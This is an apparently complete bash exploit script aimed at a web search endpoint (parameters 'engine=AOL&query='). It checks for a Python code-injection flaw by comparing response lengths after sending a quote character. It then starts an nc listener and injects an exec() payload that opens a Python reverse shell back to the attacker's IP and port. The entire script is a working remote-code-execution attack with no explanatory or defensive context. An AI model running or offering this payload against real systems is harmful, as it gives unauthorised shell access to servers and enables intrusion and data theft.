echo "check if is vulnerable..."

TARGET=$1
IP=$2
PORT=$3

f_c="aaa"
s_c="aaa'"
f_check=$(curl -X POST $TARGET -d "engine=AOL&query=$f_c" -i | grep "Content-Length:" | awk '{print $2}')
if [ "$f_check" ];then
	s_check=$(curl -X POST $TARGET -d "engine=AOL&query=$s_c" -i | grep "Content-Length:" | awk '{print $2}')
	if [ "$s_check" -eq "0" ];then
		printf "\033[32m[ + ]\033[m - open shell..."
		nc -lvnp $PORT &
		sleep 1
		printf "\033[32m[ + ]\033[m - run exploit..."
		curl -X POST $TARGET -d "engine=AOL&query=aaa', exec(\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"))#"
	else
		echo "\033[31m[ - ]\033[m - maybe not vulnerable"
	fi

fi
